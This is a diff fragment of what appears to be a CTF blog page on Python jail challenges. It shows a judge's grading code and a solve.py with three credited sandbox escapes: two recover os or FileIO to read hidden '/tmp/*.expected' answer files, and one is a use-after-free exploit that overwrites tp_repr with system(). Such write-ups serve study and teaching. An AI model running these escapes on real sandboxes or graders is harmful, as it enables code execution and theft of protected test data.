+    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'/tmp/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>submission_id<span class="token punctuation">&#125;</span></span><span class="token string">.expected'</span></span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>testcase<span class="token punctuation">.</span>output<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&#92;r&#92;n'</span><span class="token punctuation">,</span> <span class="token string">'&#92;n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    <span class="token comment"># Run code</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+       proc <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'sudo -u nobody -g nogroup python3 /tmp/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>submission_id<span class="token punctuation">&#125;</span></span><span class="token string">.py &lt; /tmp/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>submission_id<span class="token punctuation">&#125;</span></span><span class="token string">.in > /tmp/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>submission_id<span class="token punctuation">&#125;</span></span><span class="token string">.out'</span></span><span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> proc<span class="token punctuation">.</span>returncode <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
+        submission<span class="token punctuation">.</span>status <span class="token operator">=</span> <span class="token string">'Runtime Error'</span>
+        skip_remaining_cases <span class="token operator">=</span> <span class="token boolean">True</span>
+        submission_case<span class="token punctuation">.</span>status <span class="token operator">=</span> <span class="token string">'Runtime Error'</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        diff <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'diff /tmp/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>submission_id<span class="token punctuation">&#125;</span></span><span class="token string">.out /tmp/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>submission_id<span class="token punctuation">&#125;</span></span><span class="token string">.expected'</span></span><span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> capture_output<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> diff<span class="token punctuation">.</span>stdout<span class="token punctuation">:</span>
+            submission<span class="token punctuation">.</span>status <span class="token operator">=</span> <span class="token string">'Wrong Answer'</span>
+            skip_remaining_cases <span class="token operator">=</span> <span class="token boolean">True</span>
+            submission_case<span class="token punctuation">.</span>status <span class="token operator">=</span> <span class="token string">'Wrong Answer'</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            submission_case<span class="token punctuation">.</span>status <span class="token operator">=</span> <span class="token string">'Accepted'</span>
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code><!-- HTML_TAG_END --></pre>
+<ul class="list"><li><code>solve.py</code></li></ul>
+<pre class="language-py"><!-- HTML_TAG_START --><code class="language-py"><span class="token comment"># @Starlight - retrieve open from closure</span>
+<span class="token builtin">open</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">.</span>__closure__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cell_contents
+io <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">.</span>__self__
+io<span class="token punctuation">.</span>__spec__<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'sys'</span>
+sys <span class="token operator">=</span> io<span class="token punctuation">.</span>__loader__<span class="token punctuation">.</span>create_module<span class="token punctuation">(</span>io<span class="token punctuation">.</span>__spec__<span class="token punctuation">)</span>
+a <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">if</span> <span class="token string">' '</span> <span class="token keyword">not</span> <span class="token keyword">in</span> a<span class="token punctuation">:</span>
+    sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'cat /tmp/*.expected > /tmp/flag'</span><span class="token punctuation">)</span>
+<span class="token keyword">else</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token operator">+</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'cat /tmp/flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token comment"># @realansgar - retrieve FileIO / open from io wrapper</span>
+a <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">buffer</span><span class="token punctuation">.</span>raw<span class="token punctuation">.</span>__class__<span class="token punctuation">(</span><span class="token string">"/tmp/*.expected"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'cat /tmp/flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">if</span> <span class="token string">"idek"</span> <span class="token keyword">in</span> a<span class="token punctuation">:</span>
+    <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">buffer</span><span class="token punctuation">.</span>raw<span class="token punctuation">.</span>__class__<span class="token punctuation">(</span><span class="token string">"/tmp/flag"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
+
+<span class="token comment"># @salvatore.abello - UAF :brain:</span>
+<span class="token keyword">def</span> <span class="token function">__index__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">global</span> memory
+    uaf<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    memory <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    uaf<span class="token punctuation">.</span>extend<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">56</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token number">1</span>
+UAF <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__class__<span class="token punctuation">(</span><span class="token string">'UAF'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
+    <span class="token string">'__index__'</span><span class="token punctuation">:</span> __index__
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+uaf <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token number">56</span><span class="token punctuation">)</span>
+uaf<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">=</span> UAF<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">p64</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span>value <span class="token operator">>></span> <span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+wow <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__class__<span class="token punctuation">(</span><span class="token string">"wow"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>wow<span class="token punctuation">)</span>
+system_addr <span class="token operator">=</span> <span class="token builtin">id</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x653b58</span>
+sys <span class="token operator">=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
+command <span class="token operator">=</span> <span class="token string">b"js"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b" "</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    memory<span class="token punctuation">[</span><span class="token builtin">id</span><span class="token punctuation">(</span>wow<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">24</span> <span class="token operator">+</span> <span class="token number">14</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span> x<span class="token punctuation">]</span> <span class="token operator">=</span> sys<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token comment"># Overwriting tp_repr</span>
+fake <span class="token operator">=</span> wow<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+     memory<span class="token punctuation">[</span><span class="token builtin">id</span><span class="token punctuation">(</span>fake<span class="token punctuation">)</span> <span class="token operator">+</span> x<span class="token punctuation">]</span> <span class="token operator">=</span> command<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token comment"># Overwriting ob_refcnt</span>
+<span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"..."</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>fake<span class="token punctuation">)</span></code><!-- HTML_TAG_END --></pre>
 <h3 id="uiuctf-2024-astea"><a href="#uiuctf-2024-astea">UIUCTF 2024: ASTea</a></h3>
 <ul class="list"><li><code>chall.py</code></li></ul>
 <pre class="language-py"><!-- HTML_TAG_START --><code class="language-py"><span class="token keyword">import</span> ast
@@ -1508,13 +1737,13 @@ inp <span class="token operator">=</span> <span class="token builtin">input</spa
 </footer>
 
 
-		<script type="module" data-sveltekit-hydrate="xo2xtd">
-		import { set_public_env, start } from "/_app/immutable/start-3156b5a7.js";
+		<script type="module" data-sveltekit-hydrate="1xu40h6">
+		import { set_public_env, start } from "/_app/immutable/start-49bc5853.js";
 
 		set_public_env({});
 
 		start({
-			target: document.querySelector('[data-sveltekit-hydrate="xo2xtd"]').parentNode,
+			target: document.querySelector('[data-sveltekit-hydrate="1xu40h6"]').parentNode,
 			paths: {"base":"","assets":""},
 			session: {},
 			route: true,
